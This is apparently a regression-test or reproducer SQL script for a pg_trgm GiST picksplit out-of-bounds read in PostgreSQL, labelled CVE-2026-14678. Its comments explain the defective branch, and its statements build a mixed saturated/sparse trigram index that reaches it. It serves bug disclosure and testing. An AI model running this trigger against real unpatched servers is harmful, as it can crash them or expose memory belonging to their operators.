-- pg_trgm picksplit reads past a signature (upstream 1af08af694, CVE-2026-14678),
-- live at the 17.5 pin.
--
-- The defective branch at trgm_gist.c:898-901 is guarded by
--     (ISALLTRUE(datum_l) || cache[j].allistrue)  AND NOT cache[j].allistrue
-- so it needs a page split in which one SEED datum is all-true while the entry
-- being compared is not. A signature saturates to all-true when the text holds
-- more distinct trigrams than the signature has bits, so mixing long varied
-- strings with short ones produces both kinds in the same index.
CREATE EXTENSION IF NOT EXISTS pg_trgm;

CREATE TABLE trgm_split (t text);

-- Long varied rows: these saturate the signature -> allistrue.
INSERT INTO trgm_split
SELECT string_agg(md5(random()::text), ' ')
FROM generate_series(1, 200) g, generate_series(1, 400) s
GROUP BY s;

-- Short rows: these keep a sparse signature -> NOT allistrue, which is the
-- cache[j] side the defective branch reads.
INSERT INTO trgm_split
SELECT 'ab' || i FROM generate_series(1, 400) i;

-- The index build runs gtrgm_picksplit over the mixture.
CREATE INDEX trgm_split_idx ON trgm_split USING gist (t gist_trgm_ops);

DROP TABLE trgm_split;
